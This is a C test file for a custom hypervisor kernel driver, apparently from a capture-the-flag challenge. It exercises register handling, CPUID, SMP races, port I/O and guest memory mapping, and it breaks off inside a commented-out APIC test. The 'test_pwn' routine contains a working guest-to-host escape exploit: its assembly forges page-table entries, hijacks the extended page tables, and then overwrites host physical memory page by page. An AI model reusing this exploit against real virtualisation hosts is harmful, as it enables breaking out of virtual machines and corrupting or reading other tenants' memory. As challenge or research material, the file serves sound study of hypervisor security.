#define _GNU_SOURCE
#include <sys/sysinfo.h>
#include <semaphore.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>

#include "inc/ioooctls.h"

#include "mmio_man.h"

#define HOST_FW_VADDR  0x10000000
#define HOST_FW_SIZE   0xA0000
#define HOST_BIOS_VADDR 0x20000000
#define HOST_BIOS_SIZE  0x40000
#define HOST_SYS_MEM_VADDR 0x30000000
#define HOST_SYS_MEM_SIZE 0x100000

#define GUEST_FW_PADDR  0x0
#define GUEST_BIOS_PADDR 0xC0000
#define GUEST_SYS_MEM_PADDR 0x100000

#define APIC_DEFAULT_ADDRESS 0xfee00000
#define IA32_APICBASE_BSP      (1<<8)
#define IA32_APICBASE_ENABLE   (1<<11)

void guest_unmap(int hyper_fd, __u64 gpa, __u64 map_size)
{
	struct ooo_userspace_memory_region m =
	{
		.guest_phys_addr = gpa,
		.memory_size = map_size,
	};
	ioctl(hyper_fd, OOO_UNMAP, &m);
}

void *guest_map(int hyper_fd, __u64 gpa, __u64 map_size)
{
	void *guest_memory = mmap(0, map_size, PROT_WRITE | PROT_READ, MAP_SHARED, hyper_fd, gpa);
	assert(guest_memory != MAP_FAILED);
	return guest_memory;
}

#define ASM_SIZE(name) (asm_end_ ## name - asm_ ## name - 8)
#define ASM_START(name) (asm_ ## name + 8)
#define ASM_CODE(name,code) \
	static void asm_ ## name () { asm volatile( ".code16; .intel_syntax noprefix;" code "; .att_syntax; .code64;"); } \
	void asm_end_ ## name () { }

#define MEM_TO_MAP 0x200000

#define SETUP_ASMTEST(name) \
	puts("RUNNING TEST " # name); \
	int hyper_fd = open("/dev/hyper-o", O_RDWR); \
	assert(hyper_fd >= 0); \
	\
	unsigned char *guest_memory = (unsigned char *)guest_map(hyper_fd, 0, MEM_TO_MAP); \
	guest_unmap(hyper_fd, 0xA0000, 0xC0000-0xA0000); \
	memcpy((void *)(guest_memory+0xff000), ASM_START(name), ASM_SIZE(name)); \
	\
	ooo_state_t ooo_states[MAX_VCPUS] = { 0 }; \
	ooo_states[0].regs.rsp = 0; \
	ooo_states[0].regs.rip = 0xf000;

#define TEARDOWN_ASMTEST() \
	munmap(guest_memory, MEM_TO_MAP); \
	close(hyper_fd); \

#define SPAWN_CHILDREN(n) int id; for (id = cores; id; id--) if (!fork()) break; printf("PROCESS REPORTING IN: id=%d pid=%d\n", id, getpid());
#define WAIT_CHILDREN(n) \
	for (long i = 0; i < n; i++) { \
		puts("PARENT: waiting for child..."); \
		int id = wait(NULL); \
		printf("PARENT: child %d exited.\n", id); \
	} \
	puts("Children are done!");

//
// This tests register fetch.
//
ASM_CODE(setrdi, "mov di, 0x5a5a; hlt;");
void test_setrdi()
{
	SETUP_ASMTEST(setrdi);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	//printf("MOVRDI rax=%#llx rdi=%#llx", ooo_states[0].regs.rax, ooo_states[0].regs.rdi);
	assert(ooo_states[0].regs.rdi == 0x5a5a);

	TEARDOWN_ASMTEST();
}
////
//// This tests MMIO.
////
//ASM_CODE(mmio,
//         "xor ax, ax;"
//         "xor cx, cx;"
//         "mov ax, 0xA000;"
//         "mov es, ax;"
//         "mov bx, 1;"
//         "mov cl,byte PTR es:[bx];"
//         "hlt;"
//        );
//void test_mmio()
//{
//	SETUP_ASMTEST(mmio);
//
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
//	handle_mmio(&ooo_states[0], guest_memory);
//	assert(!ooo_states[0].mmio.is_write);
//	assert(ooo_states[0].mmio.phys_addr != 0xA001);
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
//	printf("guest rcx: 0x%llx\n", ooo_states[0].regs.rcx);
//
//	TEARDOWN_ASMTEST();
//}

//
// This tests MMIO reg offset bug.
//
//ASM_CODE(mmio_bad,
//         "xor ax, ax;"
//         "xor cx, cx;"
//         "mov ax, 0xA000;"
//         "mov es, ax;"
//         "mov bx, 1;"
//         "mov sp, WORD PTR es:[bx];"
//         "hlt;"
//        );
//void test_mmio_bad()
//{
//	SETUP_ASMTEST(mmio_bad);
//
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
//	handle_mmio(&ooo_states[0], guest_memory);
//	assert(!ooo_states[0].mmio.is_write);
//	assert(ooo_states[0].mmio.phys_addr != 0xA001);
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
//	printf("guest rcx: 0x%llx\n", ooo_states[0].regs.rcx);
//
//	TEARDOWN_ASMTEST();
//}


////
//// Test pio 
////
//ASM_CODE(
//	pio2,
//	"cli; cld; xor ax, ax; mov ds, ax; lgdt [0x1018];" // load the GDT
//	"mov eax, cr0; or eax, 1; mov cr0, eax;" // switch into protected mode
//	"jmp 0x8:0;" // do a long jump to clear the pipeline
//);
//ASM_CODE(
//	pio2_after_switch,
//	".code32; .intel_syntax noprefix;" // we are now in 32-bit mode
//	"mov ax, 0x10; mov ds, ax; mov es, ax; mov ss, ax;" // set up some segments
//	"mov eax, 0x100000; out 0x33, eax;" // test 32bit pio
//	"hlt;"
//	);
//void test_pio() {
//	SETUP_ASMTEST(pio2);
//	memcpy(guest_memory, ASM_START(pio2_after_switch), ASM_SIZE(pio2_after_switch));
//	assert(ASM_SIZE(pio2_after_switch) < 0x1000);
//
//	int addr_gdt = 0x1000;
//	int i = addr_gdt;
//	// the GDT
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	// gdt_code
//	//int addr_gdt_code = i;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0b10011010;
//	guest_memory[i++] = 0b11001111;
//	guest_memory[i++] = 0x0;
//	// gdt_data
//	//int addr_gdt_data = i;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0b10010010;
//	guest_memory[i++] = 0b11001111;
//	guest_memory[i++] = 0x0;
//	// gdt_end
//	int addr_gdt_end = i;
//	// gdt desc
//	//int addr_gdt_desc = i;
//	guest_memory[i++] = addr_gdt_end-addr_gdt;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x10;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	//printf("GDT DESC: %x\n", addr_gdt_desc); exit(0);
//
//	// go into protected mode
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	handle_pio2(&ooo_states[0], guest_memory);
//}
//
////
//// This tests pio IN.
////
//ASM_CODE(pio_in,
//         "xor ax, ax;"
//         "inc ax;"
//         "in al, 0x33;"
//
//         "inc ax;"
//         "in ax, 0x34;"
//
//         "inc ax;"
//         "xor dx, dx;"
//         "mov dx, 0x35;"
//         "in al, dx;"
//
//         "inc ax;"
//         "mov dx, 0x36;"
//         "in ax, dx;"
//
//         "inc ax;"
//         "in eax, 0x37;"
//
//         "inc ax;"
//         "mov dx, 0x22;"
//         "out dx, eax;"
//
//         "hlt;"
//        );
//void test_pio_in()
//{
//	SETUP_ASMTEST(pio_in);
//
//	printf("YEP 0\n");
//	// in al, 0x33
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(ooo_states[0].io.port == 0x33);
//	assert(ooo_states[0].io.size == 1);
//
//	printf("YEP 20\n");
//	// in ax, 0x34
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(ooo_states[0].io.port == 0x34);
//	assert(ooo_states[0].io.size == 2);
//	printf("YEP 21\n");
//
//	// in al, dx
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(ooo_states[0].io.port == 0x35);
//	assert(ooo_states[0].io.size == 1);
//
//	// in ax, dx
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(ooo_states[0].io.port == 0x36);
//	assert(ooo_states[0].io.size == 2);
//
//	// in eax, 0x33
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(ooo_states[0].io.port == 0x37);
//	assert(ooo_states[0].io.size == 4);
//
//	// in eax, dx
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(ooo_states[0].io.port == 0x22);
//	assert(ooo_states[0].io.size == 4);
//
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
//
//	TEARDOWN_ASMTEST();
//}
//
////
//// This tests pio OUT.
////
//ASM_CODE(pio_out,
//         "xor ax, ax;"
//         "inc ax;"
//         "out 0x33, al;"
//
//         "inc ax;"
//         "out 0x34, ax;"
//
//         "inc ax;"
//         "xor dx, dx;"
//         "mov dx, 0x35;"
//         "out dx, al;"
//
//         "inc ax;"
//         "mov dx, 0x36;"
//         "out dx, ax;"
//
//         "inc ax;"
//         "out 0x37, eax;"
//
//         "inc ax;"
//         "mov dx, 0x22;"
//         "out dx, eax;"
//
//         "hlt;"
//        );
//void test_pio_out()
//{
//	SETUP_ASMTEST(pio_out);
//
//	printf("YEP 0\n");
//	// out 0x33, al
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(*((uint64_t *)ooo_states[0].io.data) == 0x1);
//	assert(ooo_states[0].io.port == 0x33);
//	assert(ooo_states[0].io.size == 1);
//
//	printf("YEP 20\n");
//	// out 0x34, ax
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(*((uint64_t *)ooo_states[0].io.data) == 0x2);
//	assert(ooo_states[0].io.port == 0x34);
//	assert(ooo_states[0].io.size == 2);
//	printf("YEP 21\n");
//
//	// out dx, al
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(*((uint64_t *)ooo_states[0].io.data) == 0x3);
//	assert(ooo_states[0].io.port == 0x35);
//	assert(ooo_states[0].io.size == 1);
//
//	// out dx, ax
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(*((uint64_t *)ooo_states[0].io.data) == 0x4);
//	assert(ooo_states[0].io.port == 0x36);
//	assert(ooo_states[0].io.size == 2);
//
//	// out 0x33, eax
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(*((uint64_t *)ooo_states[0].io.data) == 0x5);
//	assert(ooo_states[0].io.port == 0x37);
//	assert(ooo_states[0].io.size == 4);
//
//	// out dx, eax
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_IO);
//	assert(*((uint64_t *)ooo_states[0].io.data) == 0x6);
//	assert(ooo_states[0].io.port == 0x22);
//	assert(ooo_states[0].io.size == 4);
//
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
//
//	TEARDOWN_ASMTEST();
//}

//
// This tests cpuid and in-kernel resumption.
//
ASM_CODE(cpuid, "cpuid; inc ax; hlt;");
void test_cpuid()
{
	SETUP_ASMTEST(cpuid);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	ooo_states[0].regs.rbx = 1;
	printf("rax: %llx\n", ooo_states[0].regs.rax);
	assert(ooo_states[0].regs.rax == 0x4f4f4f4f4f4f4f50);

	TEARDOWN_ASMTEST();
}

//
// This tests register modification.
//
ASM_CODE(reg_mod, "xor ax, ax; xor bx, bx; hlt; add ax, bx; inc bx; hlt;");
void test_reg_mod()
{
	SETUP_ASMTEST(reg_mod);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(ooo_states[0].regs.rax == 0);
	assert(ooo_states[0].regs.rbx == 0);

	ooo_states[0].regs.rbx = 5;
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(ooo_states[0].regs.rax == 5);
	assert(ooo_states[0].regs.rbx == 6);

	TEARDOWN_ASMTEST();
}

//
// This tests the incrementing of a register. Useful for making sure our registers are properly saved.
//
#define INC_TEST(reg) \
	ASM_CODE(inc_ ## reg, "inc " #reg "; hlt;"); \
	void test_inc_ ## reg() { \
		SETUP_ASMTEST(inc_ ## reg); \
		ooo_states[0].regs.r ## reg = 0x1337; \
		assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT); \
		assert(ooo_states[0].regs.r ## reg == 0x1338); \
		TEARDOWN_ASMTEST(); \
	}

INC_TEST(ax)
INC_TEST(bx)
INC_TEST(cx)
INC_TEST(dx)
INC_TEST(sp)
INC_TEST(bp)
INC_TEST(si)
INC_TEST(di)

//
// This tests the setting of a register. Useful for making sure our registers are properly saved.
//
#define MOV_TEST(reg) \
	ASM_CODE(mov_ ## reg, "mov " #reg ", 0x1338; hlt;"); \
	void test_mov_ ## reg() { \
		SETUP_ASMTEST(mov_ ## reg); \
		ooo_states[0].regs.r ## reg = 0x1337; \
		assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT); \
		assert(ooo_states[0].regs.r ## reg == 0x1338); \
		TEARDOWN_ASMTEST(); \
	}

MOV_TEST(ax)
MOV_TEST(bx)
MOV_TEST(cx)
MOV_TEST(dx)
MOV_TEST(sp)
MOV_TEST(bp)
MOV_TEST(si)
MOV_TEST(di)

//
// This tests jmping back from the entry point
//
ASM_CODE(jmpback, "cpuid; hlt;");
void test_jmpback()
{
	SETUP_ASMTEST(jmpback);

	memcpy(&guest_memory[0xfc000], ASM_START(jmpback), ASM_SIZE(jmpback));
	guest_memory[0xffff0] = 0xe9;
	guest_memory[0xffff1] = 0x0d;
	guest_memory[0xffff2] = 0xc0;
	ooo_states[0].regs.rip = 0xfff0;

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(ooo_states[0].regs.rax == 0x4f4f4f4f4f4f4f4f);

	TEARDOWN_ASMTEST();
}

//
// This test makes sure that SMP is real and race conditions can happen.
//
#define LOOP(x) "mov cx, 0x1000; .b" #x ": dec cx; mov bx, 0x1000; .a" #x ": dec bx; test bx, bx; jnz .a" #x "; test cx, cx; jnz .b" #x ";"
ASM_CODE(race, "xor ax, ax; mov bx, 0xc000; mov ss, bx; mov sp, 0x1000; pop ax; inc ax;" LOOP(race) "push ax; hlt;")
void test_race(long cores)
{
	SETUP_ASMTEST(race);
	SPAWN_CHILDREN(cores);

	int num_loops = 100;

	if (id)
	{
		for (int i = 0; i < num_loops; i++)
		{
			ooo_states[id - 1].regs.rip = 0xf000; // skip the hlt
			assert(ioctl(hyper_fd, OOO_RUN | (id - 1), &ooo_states[id - 1]) == EXITCOOODE_HLT);
		}
		printf("CHILD FINISHED: id=%d pid=%d", id, getpid());
		TEARDOWN_ASMTEST()
		exit(0);
	}
	else
	{
		WAIT_CHILDREN(cores);

		// make sure we lost the race at least once
		assert(((unsigned char *)guest_memory)[0xc1000] != 0);
		assert(((unsigned char *)guest_memory)[0xc1000] >= num_loops);
		assert(((unsigned char *)guest_memory)[0xc1000] < num_loops * cores);
	}


	TEARDOWN_ASMTEST();
}

//
// This tests general SMT
//
ASM_CODE(smp, "inc ax; hlt;");
void test_smp(long cores)
{
	SETUP_ASMTEST(smp);
	SPAWN_CHILDREN(cores);

	if (id)
	{
		ooo_states[id - 1].regs.rax = 0;
		for (int i = 0; i < 20 + id; i++)
		{
			ooo_states[id - 1].regs.rip = 0xf000; // loop
			assert(ioctl(hyper_fd, OOO_RUN | (id - 1), &ooo_states[id - 1]) == EXITCOOODE_HLT);
			assert(ooo_states[id - 1].regs.rax != 0);
		}
		printf("CHILD FINISHED: id=%d pid=%d", id, getpid());
		TEARDOWN_ASMTEST()
		exit(0);
	}
	else
	{
		WAIT_CHILDREN(cores);
		for (long i = 0; i < cores; i++)
		{
			assert(ioctl(hyper_fd, OOO_PEEK | i, &ooo_states[i]) == 0);
			assert(ooo_states[i].regs.rax == (__u64)20 + i + 1);
		}
	}


	TEARDOWN_ASMTEST();
}

//
// This makes sure that different threads can juggle vCPUs.
//
ASM_CODE(swap, "inc ax; hlt;");
void test_swap(long cores)
{
	SETUP_ASMTEST(swap);

	sem_t *s = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, 0, 0);
	for (int i = 0; i < MAX_VCPUS; i++)
	{
		sem_init(&s[i], 1, 1);
		ooo_states[i].regs.rax = 0;
	}

	SPAWN_CHILDREN(cores);

	if (id)
	{
		for (int i = 0; i < 10; i++)
		{
			int v = (i + id) % cores;
			printf("CHILD WAITING FOR %d: id=%d pid=%d", v, id, getpid());
			sem_wait(&s[v]);

			assert(ioctl(hyper_fd, OOO_PEEK | v, &ooo_states[v]) == 0);

			ooo_states[v].regs.rip = 0xf000; // loop
			assert(ioctl(hyper_fd, OOO_RUN | v, &ooo_states[v]) == EXITCOOODE_HLT);
			assert(ooo_states[v].regs.rax != 0);

			sem_post(&s[v]);
		}
		printf("CHILD FINISHED: id=%d pid=%d", id, getpid());
		TEARDOWN_ASMTEST()
		exit(0);
	}
	else
	{
		WAIT_CHILDREN(cores);
		for (long i = 0; i < cores; i++)
		{
			assert(ioctl(hyper_fd, OOO_PEEK | i, &ooo_states[i]) == 0);
			assert(ooo_states[i].regs.rax == (__u64)10);
		}
	}


	TEARDOWN_ASMTEST();
}

//
// This tests that all of the memory before the VGA is addressable.
//
ASM_CODE(
	memfill_to_vga,
	"mov bx, 0; mov dx, 0; mov ds, dx; .mtv_head:"
	"mov byte ptr ds:[bx], 0x41; inc bx; test bx, bx; jnz .mtv_head;"
	"inc dx; mov ds, dx; test dx, dx; jnz .mtv_head;"
)
void test_memfill_to_vga()
{
	SETUP_ASMTEST(memfill_to_vga);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
	assert(ooo_states[0].mmio.phys_addr == 0xA0000);
	assert(ooo_states[0].mmio.is_write);
	for (int i = 0; i < 0xA0000; i++) assert(guest_memory[i] == 'A');

	TEARDOWN_ASMTEST();
}

//
// This tests memory after the vga is accessible
//
ASM_CODE(after_vga, "mov dx, 0xd000; mov ds, dx; mov bx, 0x1337; mov byte ptr ds:[bx], 0x41; hlt");
void test_after_vga()
{
	SETUP_ASMTEST(after_vga);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(guest_memory[0xd1337] == 'A');

	TEARDOWN_ASMTEST();
}

ASM_CODE(vga_fault, "mov dx, 0xa000; mov ds, dx; mov bx, 0x1337; mov byte ptr ds:[bx], 0x41; hlt");
void test_vga_fault()
{
	SETUP_ASMTEST(vga_fault);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
	assert(ooo_states[0].mmio.phys_addr == 0xA1337);
	assert(ooo_states[0].mmio.is_write);

	TEARDOWN_ASMTEST();
}

//
// Test mov eax
//

ASM_CODE(mov_eax, "cpuid; xor eax, eax; mov eax, 0x41424344; hlt;");
void test_mov_eax()
{
	SETUP_ASMTEST(mov_eax);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	printf("RAX: %llx\n", ooo_states[0].regs.rax);
	assert((ooo_states[0].regs.rax & 0xffffffff) == 0x41424344);

	TEARDOWN_ASMTEST();
}

//
// this tests going into protected mode
//
ASM_CODE(
	pwn,
	"cli; cld; xor ax, ax; mov ds, ax; lgdt [0x1018];" // load the GDT
	"mov eax, cr0; or eax, 1; mov cr0, eax;" // switch into protected mode
	"jmp 0x8:0;" // do a long jump to clear the pipeline
);
ASM_CODE(
	pwn_after_switch,
	".code32; .intel_syntax noprefix;" // we are now in 32-bit mode
	"mov ax, 0x10; mov ds, ax; mov es, ax; mov ss, ax;" // set up some segments
	"xor eax, eax; mov eax, 0x41424344; mov byte ptr [eax], 0x41;"
	"hlt;"
	"mov ebx, 0x200000; xor eax, eax; mov eax, [ebx];" // eax is the old EPTP, pointing to our old PML4
	"hlt;"
	// the attack
	"mov ecx, eax; shr ecx, 12; shl ecx, 12; sub ecx, 0x2000;" // ecx is the address of our PML4 (also the last legitimate page)
	"mov ebx, ecx; sub ebx, 0x1000; or ebx, 7;" // ebx is now a legitimate PML4 entry, pointing to a PDPT
	"mov edi, 0x1ff000; mov [edi], ebx;" // write pml4[0], pointing to PDPT
	"sub ebx, 0x1000;" // ebx now a legitimate PDPT entry, pointing to a PD
	"mov edi, 0x1fe000; mov [edi], ebx;" // write pdpt[0], pointing to PD
	"sub ebx, 0x1000;" // ebx now a legitimate PD entry, pointing to a PT
	"mov edi, 0x1fd000; mov [edi], ebx;" // write pd[0], pointing to PT
	// now, let's make sure we can mess with the PT after hijack. We'll map it at 0x3000
	"or ebx, 0x477; mov edi, 0x1fc018; mov [edi], ebx;"
	// let's also map the old PML4 to 0x4000, to prove to ourselves that we can access it
	"mov ebx, eax; and ebx, 0xfffff000; or ebx, 0x477; mov edi, 0x1fc020; mov [edi], ebx;"
	// now, we need to craft a PT to keep executing (with a suffix of 0x477)
	"mov ebx, ecx; sub ebx, 0x1ff000; or ebx, 0x477;" // ebx is now a valid page address for address 0
	"mov edi, 0x1fc000; mov [edi], ebx;" // write pt[0], pointing to the very first page
	// now let's map in some good stuff
	//"add ebx, 0x1800000; mov edi, 0x1fc008; mov [edi], ebx;"
	"mov edi, 0x1337;"
	"hlt;"
	// this hijacks the EPT
	"ror eax, 12; sub eax, 2; rol eax, 12; mov edi, 0x200000; mov dword ptr [edi], eax;"
	"mov edi, 0x1338;"
	"hlt;"
	// let's make sure we can still run
	"nop; nop; nop; hlt;"
	// make sure we can read the page table
	"mov edi, 0x3000; mov eax, [edi]; hlt;"
	// check that we can read the old PML4
	"mov edi, 0x4000; mov eax, [edi]; hlt;"
	// make sure 0x2000 is unmapped
	"mov esp, 0x2100; push esp;"
	// do something drastic
	"mov eax, -1; mov ebx, 0; mov ecx, -1; mov edx, 0; mov esi, -1; mov edi, -1; mov esp, -1; mov ebp, -1;"
	"mov ecx, 0x40002ffc; .clobberer:" // ecx is the host physical address
	"mov eax, 1;"
	"mov esi, ecx; and esi, 0xfff; cmp esi, 0xffc; jnz .old_page;" // only map in new pages
	"mov esi, ecx; and esi, 0xfffff000; or esi, 0x477;" // esi: EPT entry for the page
	"mov eax, 2; inc edx;"
	"mov edi, 0x3008; mov [edi], esi;" // write the EPT entry
	"wbinvd;" // flush the caches?
	".old_page:"
	"mov eax, 3;"
	"mov edi, ecx; and edi, 0xfff;" // page offset address for ecx
	"mov eax, 4;"
	"or ebx, dword ptr [edi+0x1000];" // read memory
	"mov dword ptr [edi+0x1000], 0xf4f4f4f4;" // clobber memory
	"mov eax, 5;"
	"sub ecx, 4; test ecx, ecx; jnz .clobberer;" // let's keep going
	"hlt;"
	// do the attack!
	//"mov edi, 0; .leetwrite:"
	//"mov dword ptr [edi+0x1000], 0xf4f4f4f4;"
	//"add edi, 4; and edi, 0xfff;"
	//"test edi, edi; jnz .leetwrite;"
	//"hlt"
)
void test_pwn()
{
	SETUP_ASMTEST(pwn);

	memcpy(guest_memory, ASM_START(pwn_after_switch), ASM_SIZE(pwn_after_switch));
	assert(ASM_SIZE(pwn_after_switch) < 0x1000);

	int addr_gdt = 0x1000;
	int i = addr_gdt;
	// the GDT
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	guest_memory[i++] = 0;
	// gdt_code
	//int addr_gdt_code = i;
	guest_memory[i++] = 0xff;
	guest_memory[i++] = 0xff;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0b10011010;
	guest_memory[i++] = 0b11001111;
	guest_memory[i++] = 0x0;
	// gdt_data
	//int addr_gdt_data = i;
	guest_memory[i++] = 0xff;
	guest_memory[i++] = 0xff;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0b10010010;
	guest_memory[i++] = 0b11001111;
	guest_memory[i++] = 0x0;
	// gdt_end
	int addr_gdt_end = i;
	// gdt desc
	//int addr_gdt_desc = i;
	guest_memory[i++] = addr_gdt_end-addr_gdt;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x10;
	guest_memory[i++] = 0x0;
	guest_memory[i++] = 0x0;
	//printf("GDT DESC: %x\n", addr_gdt_desc); exit(0);

	// go into protected mode
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);

	// test OOB writes
	assert((ooo_states[0].regs.rax & 0xffffffff) == 0x41424344);
	assert(ooo_states[0].mmio.phys_addr == 0x41424344);

	// make sure we can write to high memory
	ooo_states[0].regs.rax = MEM_TO_MAP-4;
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(guest_memory[MEM_TO_MAP-4] == 'A');

	// make sure we can read the EPT
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(ooo_states[0].regs.rax);

	// set up the fake page table structures
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(ooo_states[0].regs.rdi == 0x1337);

	//sleep(1);
	//printf(
	//	"pml4[0]=%#llx pdpt[0]=%#llx pd[0]=%#llx pt[0]=%#llx pt[1]=%#llx\n",
	//	*(__u64 *)(guest_memory+0x3ff000),
	//	*(__u64 *)(guest_memory+0x3fe000),
	//	*(__u64 *)(guest_memory+0x3fd000),
	//	*(__u64 *)(guest_memory+0x3fc000),
	//	*(__u64 *)(guest_memory+0x3fc008)
	//);
	//sleep(1);

	// corrupt the EPT!
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert(ooo_states[0].regs.rdi == 0x1338);

	// make sure we can still run
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);

	// make sure we can read the page table
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	assert((ooo_states[0].regs.rax & 0x477) == 0x477);

	// make sure we can read the old PML4
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	//printf("OLD PML4: %#llx", ooo_states[0].regs.rax);
	assert(ooo_states[0].regs.rax);

	// make sure the push to unmapped memory
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
	assert(ooo_states[0].regs.rsp == 0x2100);
	ooo_states[0].regs.rip++;

	// do our attack -- hopefully, this won't return
	printf("\n\n\nLET'S DO IT!!!\n\n\n");
	// let's not do it by default:
	int r = ioctl(hyper_fd, OOO_RUN, &ooo_states[0]);
	printf("exit_code=%d rcx=%llx\n", r, ooo_states[0].regs.rcx);

	// let's see if we can read some memory
	//assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);
	//assert(ooo_states[0].regs.rsi);

	TEARDOWN_ASMTEST();
}

//
// This tests preemption
//
ASM_CODE(jmpman, ".jmpman: jmp .jmpman;")
void test_preemption()
{
	SETUP_ASMTEST(jmpman);

	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_HLT);

	TEARDOWN_ASMTEST();

}

//
// this tests apic access
//
//ASM_CODE(
//	apic,
//	"cli; cld; xor ax, ax; mov ds, ax; lgdt [0x1018];" // load the GDT
//	"mov eax, cr0; or eax, 1; mov cr0, eax;" // switch into protected mode
//	"jmp 0x8:0;" // do a long jump to clear the pipeline
//);
//ASM_CODE(
//	apic_after_switch,
//	".code32; .intel_syntax noprefix;" // we are now in 32-bit mode
//	"mov ax, 0x10; mov ds, ax; mov es, ax; mov ss, ax;" // set up some segments
//	"xor eax, eax; mov cx, 0x1b; rdmsr;" // get apic base
//	"mov byte ptr[eax], 0x41;" // write to apic base
//	"hlt;"
//	)
//void test_apic() 
//{
//	SETUP_ASMTEST(apic);
//
//	memcpy(guest_memory, ASM_START(apic_after_switch), ASM_SIZE(pwn_after_switch));
//	assert(ASM_SIZE(pwn_after_switch) < 0x1000);
//
//	int addr_gdt = 0x1000;
//	int i = addr_gdt;
//	// the GDT
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	guest_memory[i++] = 0;
//	// gdt_code
